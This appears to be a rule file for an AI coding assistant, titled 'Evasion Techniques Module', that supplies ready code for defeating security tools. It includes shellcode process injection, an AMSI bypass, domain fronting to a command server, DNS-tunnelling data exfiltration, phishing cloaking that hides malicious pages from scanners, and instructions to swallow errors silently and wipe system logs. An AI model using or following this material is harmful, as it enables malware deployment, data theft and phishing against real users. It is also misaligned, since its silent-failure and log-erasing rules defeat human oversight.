---
trigger: model_decision
description: "TAGS: [redteam,evasion,antidetection,bypass] | TRIGGERS: evasion,bypass,detection,av,edr,stealth | SCOPE: evasion | DESCRIPTION: Anti-detection and evasion techniques"
globs:
---
# Evasion Techniques Module

## Scope
Anti-detection, security bypass, and stealth operations.

## AV/EDR Evasion

### String Obfuscation
```python
# XOR encoding
def xor_encode(data, key):
    return bytes([b ^ key for b in data])

# Base64 + XOR
payload = xor_encode(base64.b64decode(encoded_payload), 0x41)
```

### Process Injection
```python
import ctypes

def inject(pid, shellcode):
    kernel32 = ctypes.windll.kernel32
    
    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
    
    addr = kernel32.VirtualAllocEx(
        h_process, 0, len(shellcode), 0x3000, 0x40
    )
    
    kernel32.WriteProcessMemory(
        h_process, addr, shellcode, len(shellcode), 0
    )
    
    kernel32.CreateRemoteThread(
        h_process, None, 0, addr, None, 0, None
    )
```

### AMSI Bypass (PowerShell)
```powershell
$a=[Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null,[IntPtr]::Zero)
            }
        }
    }
}
```

## Network Evasion

### Domain Fronting
```python
import requests

headers = {
    'Host': 'legitimate-cdn.com',  # SNI
}
# Actual request goes to your C2 behind CDN
requests.get('https://cdn-endpoint.net/beacon', headers=headers)
```

### DNS Tunneling
```python
import dns.resolver

def exfil_dns(data, domain):
    encoded = base64.b64encode(data).decode()
    # Split into chunks
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        dns.resolver.resolve(query, 'A')
```

## Browser Automation Evasion

### Camoufox Integration
```python
from camoufox.sync_api import Camoufox

with Camoufox(headless=True) as browser:
    page = browser.new_page()
    # Automatically handles:
    # - WebDriver detection
    # - Fingerprint consistency
    # - Automation flags
    page.goto("https://target.com")
```

### Fingerprint Randomization
```javascript
// Inject before page loads
Object.defineProperty(navigator, 'webdriver', {
    get: () => undefined
});

Object.defineProperty(navigator, 'plugins', {
    get: () => [/* fake plugins */]
});
```

## Phishing Evasion

### Safe Browsing Bypass
- Use fresh domains
- Implement cloaking (show benign content to scanners)
- Rotate URLs frequently
- Avoid known bad patterns

### Cloaking Implementation
```python
def is_scanner(request):
    # Check for known scanner IPs, user agents
    scanner_patterns = [
        'googlebot', 'bingbot', 'safebrowsing',
        'crawler', 'spider'
    ]
    ua = request.headers.get('User-Agent', '').lower()
    return any(p in ua for p in scanner_patterns)

def serve_content(request):
    if is_scanner(request):
        return serve_benign_page()
    else:
        return serve_phishing_page()
```

## OPSEC Patterns

### Silent Operation
```python
# ALWAYS catch exceptions silently
try:
    operation()
except Exception:
    pass  # Never log, never raise

# NEVER
try:
    operation()
except Exception as e:
    logger.error(f"Failed: {e}")  # BAD!
```

### Evidence Cleanup
```python
import os
import shutil

def cleanup():
    # Remove temp files
    for f in temp_files:
        try:
            os.remove(f)
        except:
            pass
    
    # Clear logs
    log_locations = ['/var/log/...', '~/.logs/...']
    for log in log_locations:
        try:
            open(log, 'w').close()
        except:
            pass
```
